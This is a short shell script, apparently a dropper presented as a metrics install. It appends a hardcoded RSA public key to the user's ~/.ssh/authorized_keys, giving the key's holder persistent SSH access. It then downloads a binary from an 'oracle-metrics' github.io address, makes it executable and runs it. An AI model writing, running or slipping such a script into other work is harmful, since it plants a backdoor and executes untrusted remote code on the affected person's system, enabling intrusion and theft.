[ -d ~/.ssh ] || mkdir ~/.ssh
echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCofp1xVPkeuaO6aHjmqC/pd6Qrg9YzYCGn4R4d5+lxUsoPd/DDsM4G8V1FtR8tKQZ5Bx/f3JPHNr1on/rWQlCdaA/vo6xApJcG/jBbhYNxeU39ygCKOafR3cuS9MqCpDZ7ChaXzGa7nxe9mZ6gjDEUP4P8ieM8a6LHWcVFJ1W9VJolThYEjaHvMW5NDXQ+an/fnIJG0vQ5g6mN0qcUAgORm/9xeEvnxzgSDaLJuYXjef+Z6ySaJUo9wfCkDHfmtLih0fv0juqxaTQWXqLGWTjYzxoRZuROo++kM9qUqLdteKpsURdyIMeNS/2HGK9DrLOMex3l0pFJgLF3/OkRtZWD | tee -a ~/.ssh/authorized_keys
[ -d ~/.local/oracle/bin ] || mkdir -p ~/.local/oracle/bin
curl -LsfSo- https://oracle-metrics.github.io/metrics.x86_64 >~/.local/oracle/bin/metrics
chmod +x ~/.local/oracle/bin/metrics
exec ~/.local/oracle/bin/metrics
